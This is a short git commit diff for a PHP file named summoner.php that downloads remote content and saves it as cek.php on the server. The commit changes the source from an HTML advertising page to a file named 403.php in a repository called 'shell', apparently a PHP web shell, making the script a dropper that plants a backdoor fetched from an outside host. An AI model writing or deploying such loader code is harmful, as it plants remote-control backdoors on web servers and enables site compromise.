8a58a894db24873ab53c66a43ee643607ccee196
Hexa Decimal <zadbagus7@gmail.com>
2025-04-13 09:54:15 +0700

    Update summoner.php

--- summoner.php
+++ summoner.php
@@ -1,5 +1,5 @@
 <?php
-$content = file_get_contents('https://raw.githubusercontent.com/purwocode/IKLAN/main/kilang.html');
+$content = file_get_contents('https://raw.githubusercontent.com/purwocode/shell/refs/heads/main/403.php');
 file_put_contents('cek.php', $content);
 echo "File berhasil disimpan.";
 ?>
